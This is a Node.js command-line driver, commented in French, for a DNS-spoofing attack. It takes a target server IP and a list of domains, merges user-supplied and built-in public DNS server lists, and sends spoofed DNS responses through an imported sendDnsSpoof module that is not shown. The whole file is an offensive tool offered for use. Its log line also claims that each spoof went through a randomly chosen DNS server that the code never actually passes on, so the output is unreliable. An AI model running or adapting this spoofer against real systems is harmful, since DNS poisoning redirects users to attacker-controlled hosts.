#!/usr/bin/env node
const { sendDnsSpoof, freeDNS } = require("./dns-spoofer.js");
const fs = require("fs");

// ------------------
// CLI arguments
// ------------------
const args = process.argv.slice(2);
const customFileArg = args.find(a => a.startsWith("-dns="));
const domainArg = args.find(a => a.startsWith("-domain="));
const serverArg = args.find(a => a.startsWith("-server="));

const server = serverArg ? serverArg.split("=")[1] : null;
if (!server) {
    console.error("[-] Veuillez fournir le serveur cible via -server=IP");
    process.exit(1);
}

const domains = domainArg ? domainArg.split("=")[1].split(",") : ["example.com"];
let userList = [];

// Charger liste custom si fournie
if (customFileArg) {
    const file = customFileArg.split("=")[1];
    if (fs.existsSync(file)) {
        try {
            const data = JSON.parse(fs.readFileSync(file, "utf8"));
            if (Array.isArray(data)) userList = data;
        } catch (e) {
            console.error("[-] Impossible de lire le JSON custom :", e.message);
        }
    }
}

// Fusion avec freeDNS et suppression doublons
userList = [...new Set([...userList, ...freeDNS])];
console.log(`[i] ${userList.length} serveurs DNS disponibles`);

// ------------------
// Envoi d'une requête par domaine, serveur DNS choisi au hasard
// ------------------
domains.forEach(domain => {
    const randomDNS = userList[Math.floor(Math.random() * userList.length)];
    sendDnsSpoof(server, domain);
    console.log(`[+] Spoof envoyé pour le domaine ${domain} via DNS ${randomDNS}`);
});

/*
#!/usr/bin/env node
const path = require("path");
const { spawn } = require("child_process");

// Chemin vers le script principal
const testScript = path.join(__dirname, "test.js");

// Récupère tous les arguments passés à la CLI
const args = process.argv.slice(2);

// Lancement du script test.js avec tous les arguments, logs live
const proc = spawn("node", [testScript, ...args], { stdio: "inherit" });

proc.on("close", code => {
  console.log(`CLI terminée avec code ${code}`);
});

proc.on("error", err => {
  console.error("Erreur lors du lancement du script :", err);
});
*/
